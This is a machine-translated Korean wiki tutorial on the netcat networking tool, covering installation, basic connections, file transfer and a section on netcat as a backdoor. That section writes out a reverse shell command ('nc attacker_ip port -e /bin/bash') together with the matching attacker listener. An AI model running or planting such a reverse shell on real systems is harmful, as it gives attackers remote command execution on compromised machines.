---
title: Netcat 사용 방법: 네트워크 통신용 명령줄 도구
description: 
published: true
date: 2023-03-11T22:32:30.065Z
tags: 
editor: markdown
dateCreated: 2023-03-11T22:32:30.065Z
---

> 이 문서는 **Google Cloud Translation API를 사용해 자동 번역**되었습니다.
어떤 문서는 원문을 읽는게 나을 수도 있습니다.{.is-info}



- [How to Use Netcat: A Command-Line Tool for Network Communications***English** document is available*](/en/Knowledge-base/Network/how-to-use-netcat-a-command-line-tool-for-network-communications)
{.links-list}

## 소개

Netcat(종종 nc로 약칭)은 네트워크 통신에 사용되는 명령줄 도구입니다. 네트워크 연결을 설정 및 상호 작용하고, 네트워크 서비스 및 응용 프로그램을 테스트하고, 네트워크를 통해 파일을 전송하는 데 사용할 수 있는 강력하고 다양한 유틸리티입니다. Netcat은 공격자가 제어하는 시스템을 위한 네트워크 디버깅 도구 및 백도어 작성자로도 사용할 수 있습니다. 이 기사에서는 Netcat을 사용하는 방법과 다양한 기능을 탐색하는 방법에 대해 설명합니다.

## 넷캣 설치하기

Netcat의 기능을 살펴보기 전에 Netcat을 설치해야 합니다. Netcat은 대부분의 Linux 배포판에서 사용할 수 있으며 배포판의 패키지 관리자를 사용하여 설치할 수 있습니다. 예를 들어 Ubuntu에서 다음 명령을 사용하여 Netcat을 설치할 수 있습니다.

```bash
sudo apt-get install netcat
```

macOS에서는 다음을 실행하여 Homebrew를 사용하여 Netcat을 설치할 수 있습니다.

```bash
brew install netcat
```

Windows에서 Netcat은 공식 웹사이트 http://joncraton.org/files/nc111nt.zip에서 다운로드할 수 있습니다.

## 기본 사용법

Netcat은 다양한 방법으로 사용할 수 있지만 가장 기본적인 용도는 특정 포트의 원격 호스트에 대한 연결을 설정하는 것입니다. 원격 호스트에 대한 연결을 설정하려면 다음 구문을 사용하십시오.

```bash
nc [options] hostname port
```

여기서 `hostname`은 원격 호스트의 이름 또는 IP 주소이고 `port`는 원격 서비스가 수신하는 포트 번호입니다. 예를 들어 호스트 example.com의 포트 80에 연결하려면 다음을 실행할 수 있습니다.

```bash
nc example.com 80
```

그러면 호스트 example.com의 포트 80에 대한 TCP 연결이 설정됩니다. 연결이 설정되면 Netcat 세션을 통해 원격 서비스와 상호 작용할 수 있습니다.

## 백도어로서의 Netcat

Netcat은 공격자가 제어하는 시스템의 백도어 생성기로도 사용할 수 있습니다. 예를 들어 공격자는 Netcat을 사용하여 손상된 시스템에 대한 연결을 설정하고 원격 액세스 권한을 얻을 수 있습니다. 백도어를 생성하려면 공격자는 인터넷에서 액세스할 수 있는 포트에서 서버 모드로 Netcat을 실행해야 합니다. 이는 다음 명령을 사용하여 수행할 수 있습니다.

```bash
nc -l -p port
```

여기서 'port'는 Netcat이 들어오는 연결을 수신할 포트 번호입니다. Netcat이 지정된 포트에서 수신 대기하면 공격자는 다음 명령을 사용하여 원격 시스템에서 Netcat에 대한 연결을 설정할 수 있습니다.

```bash
nc attacker_ip port -e /bin/bash
```

여기서 'attacker_ip'는 공격자 시스템의 IP 주소이고 'port'는 Netcat이 수신 대기 중인 포트 번호입니다. `-e` 옵션은 연결이 설정되면 Netcat에 지정된 프로그램(이 경우 `/bin/bash`)을 실행하도록 지시합니다. 연결이 설정되면 공격자는 Netcat 세션을 통해 손상된 시스템에서 명령을 실행할 수 있습니다.

## 파일 전송

Netcat은 네트워크를 통해 파일을 전송하는 데에도 사용할 수 있습니다. Netcat을 사용하여 파일을 전송하려면 발신자는 특정 포트에서 서버 모드로 Netcat을 실행해야 하고, 수신자는 파일을 가져오기 위해 클라이언트 모드로 Netcat을 실행해야 합니다. 파일을 전송하려면 먼저 보낸 사람이 자신의 시스템에서 다음 명령을 실행해야 합니다.

```bash
nc -l -p port < file_to_send
```

여기서 'port'는 Netcat이 들어오는 연결을 수신할 포트 번호이고 'file_to_send'는 보내야 하는 파일의 이름입니다. Netcat이 지정된 포트에서 수신 대기하면 수신자는 다음 명령을 사용하여 파일을 가져올 수 있습니다.

```bash
nc sender_ip port > received_file
```

여기서 'sender_ip'는 발신자 시스템의 IP 주소, 'port'는 Netcat이 수신 대기 중인 포트 번호, 'received_file'은 수신자 시스템에 저장될 파일 이름입니다.

## 결론

Netcat은 광범위한 네트워크 통신에 사용할 수 있는 강력하고 다양한 도구입니다. 이 기사에서는 Netcat을 사용하여 네트워크 연결을 설정하고 백도어를 만들고 네트워크를 통해 파일을 전송하는 방법에 대해 설명했습니다. Netcat은 IT 개발에 유용한 도구일 수 있지만 악의적인 목적으로 사용될 수도 있습니다. 따라서 책임감 있고 윤리적으로 Netcat을 사용하는 것이 중요합니다.

## 외부 리소스

- [넷캣 위키백과](https://en.wikipedia.org/wiki/Netcat)
- [Linux 네트워크 관리를 위한 25가지 Netcat 명령](https://www.ubuntupit.com/netcat-commands-for-managing-linux-networks/)
- [Netcat의 힘 탐구](https://www.linuxjournal.com/article/9814)